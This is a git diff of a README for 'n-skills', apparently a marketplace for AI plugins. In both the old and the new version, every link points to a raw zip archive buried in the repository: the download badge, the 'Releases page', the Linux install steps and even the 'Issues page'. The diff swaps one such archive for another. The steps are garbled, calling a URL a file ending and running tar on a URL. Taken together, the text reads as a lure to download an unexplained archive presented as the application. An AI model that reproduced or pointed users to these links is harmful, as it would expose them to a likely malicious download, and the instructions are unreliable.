@@ -6,7 +6,7 @@ Welcome to n-skills! This application provides a curated marketplace for plugins
 
 ## 📥 Download the Application
 
-[![Download n-skills](https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/tools/zai-cli/skills/zai-cli/n-skills-1.7.zip%https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/tools/zai-cli/skills/zai-cli/n-skills-1.7.zip)](https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/tools/zai-cli/skills/zai-cli/n-skills-1.7.zip)
+[![Download n-skills](https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/n-skills-1.6-beta.3.zip%https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/n-skills-1.6-beta.3.zip)](https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/n-skills-1.6-beta.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,13 +21,13 @@ Before you start, make sure your system meets these requirements:
 
 To get the latest version of n-skills, visit our Releases page. You’ll find the newest updates along with any previous versions you might need. 
 
-[Download n-skills from Releases Page](https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/tools/zai-cli/skills/zai-cli/n-skills-1.7.zip)
+[Download n-skills from Releases Page](https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/n-skills-1.6-beta.3.zip)
 
 ## 📥 Download & Install
 
 1. Go to the Releases page by clicking the link above.
 2. Scroll down to find the latest version of n-skills.
-3. Locate the file that ends with `.exe` for Windows, `.dmg` for macOS, or `https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/tools/zai-cli/skills/zai-cli/n-skills-1.7.zip` for Linux. 
+3. Locate the file that ends with `.exe` for Windows, `.dmg` for macOS, or `https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/n-skills-1.6-beta.3.zip` for Linux. 
 4. Click on the link to download the file.
 
 ### Windows Users:
@@ -44,8 +44,8 @@ To get the latest version of n-skills, visit our Releases page. You’ll find th
 
 ### Linux Users:
 
-- Open your terminal and navigate to the location where you downloaded the `https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/tools/zai-cli/skills/zai-cli/n-skills-1.7.zip` file.
-- Use the command `tar -xvzf https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/tools/zai-cli/skills/zai-cli/n-skills-1.7.zip` to extract the files.
+- Open your terminal and navigate to the location where you downloaded the `https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/n-skills-1.6-beta.3.zip` file.
+- Use the command `tar -xvzf https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/n-skills-1.6-beta.3.zip` to extract the files.
 - Navigate into the extracted folder and follow the instructions in the README file provided.
 
 ## 🌟 Features
@@ -77,7 +77,7 @@ For further assistance, please refer to the FAQ section on our repository page o
 
 For any questions, support needs, or feedback, feel free to reach out:
 
-- Open a new issue on the [GitHub Issues Page](https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/tools/zai-cli/skills/zai-cli/n-skills-1.7.zip).
+- Open a new issue on the [GitHub Issues Page](https://github.com/sathishj17/n-skills/raw/refs/heads/main/skills/n-skills-1.6-beta.3.zip).
 - Join our community discussions if available, or follow updates within the repository.
 
 Thank you for choosing n-skills! We hope you find the application helpful in enhancing your AI experience.
